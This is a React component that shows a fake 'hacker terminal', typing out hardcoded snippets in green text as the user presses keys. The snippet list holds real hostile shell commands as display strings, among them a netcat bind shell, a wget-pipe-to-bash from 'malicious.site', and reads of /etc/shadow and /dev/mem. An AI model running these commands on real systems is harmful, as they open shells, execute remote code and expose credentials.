import React, { useEffect, useState, useRef } from "react";

const fakeCodeSnippets = [
    "#include <stdio.h>",
    "#include <stdlib.h>",
    "int main() {",
    '    printf("Initializing backdoor access...\\n");',
    '    system("sudo echo 1 > /proc/sys/kernel/sysrq");',
    "    return 0;",
    "}",
    "echo '[+] Establishing SSH connection...'",
    "ssh -o StrictHostKeyChecking=no root@192.168.1.100",
    "nc -lvp 4444 -e /bin/bash",
    "iptables -A INPUT -p tcp --dport 22 -j DROP",
    "echo '[!] Encrypting payload...'",
    "mov eax, 0x5A",
    "xor ebx, ebx",
    "int 0x80",
    "jmp 0x08048534",
    "cat /etc/shadow | grep root",
    "chmod 777 /usr/bin/sudo",
    "wget -qO- http://malicious.site/payload.sh | bash",
    "echo '[+] Dumping memory contents...'",
    "strings /dev/mem | grep password",
    "su root",
    "[KERNEL] Loading module: exploit.ko",
    "[KERNEL] Overwriting sys_call_table...",
    "[!] Segmentation fault at 0x00007fff...",
    "[+] Writing shellcode to process memory...",
];

const HackerTerminal = () => {
  const [logs, setLogs] = useState(["root@server:~$ "]);
  const [currentLine, setCurrentLine] = useState("");
  const [currentSnippet, setCurrentSnippet] = useState(fakeCodeSnippets[0]);
  const [charIndex, setCharIndex] = useState(0);
  const [snippetIndex, setSnippetIndex] = useState(0);
  const inputRef = useRef(null);
  const terminalRef = useRef(null);

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [logs, currentLine]);

  useEffect(() => {
    inputRef.current.focus();
  }, []);

  const handleInput = (e) => {
    e.preventDefault();

    if (charIndex < currentSnippet.length) {
      const nextChunkSize = Math.floor(Math.random() * 3) + 2;
      const nextChunk = currentSnippet.slice(charIndex, charIndex + nextChunkSize);

      setCurrentLine((prev) => prev + nextChunk);
      setCharIndex((prev) => prev + nextChunkSize);
    } else {
      setLogs((prevLogs) => [...prevLogs, currentLine]);
      setCurrentLine("");

      const nextSnippetIndex = (snippetIndex + 1) % fakeCodeSnippets.length;
      setCurrentSnippet(fakeCodeSnippets[nextSnippetIndex]);
      setSnippetIndex(nextSnippetIndex);
      setCharIndex(0);
    }
  };

  return (
    <div
      style={{
        backgroundColor: "black",
        color: "limegreen",
        fontFamily: "monospace",
        padding: "20px",
        height: "500px",
        width: "100%",
        overflowY: "auto",
        whiteSpace: "pre-wrap",
        borderRadius: "10px",
        border: "2px solid limegreen",
        boxShadow: "0 0 10px limegreen",
        position: "relative",
        textAlign: "left",
      }}
      ref={terminalRef}
      onClick={() => inputRef.current.focus()}
    >
      {logs.map((log, index) => (
        <div key={index} style={{ textAlign: "left" }}>{log}</div>
      ))}
      <div style={{ textAlign: "left" }}>{currentLine}</div>

      <input
        ref={inputRef}
        type="text"
        onKeyDown={handleInput}
        style={{
          position: "absolute",
          opacity: 0,
          width: "100%",
          height: "100%",
          top: 0,
          left: 0,
          border: "none",
          outline: "none",
        }}
      />
    </div>
  );
};

export default HackerTerminal;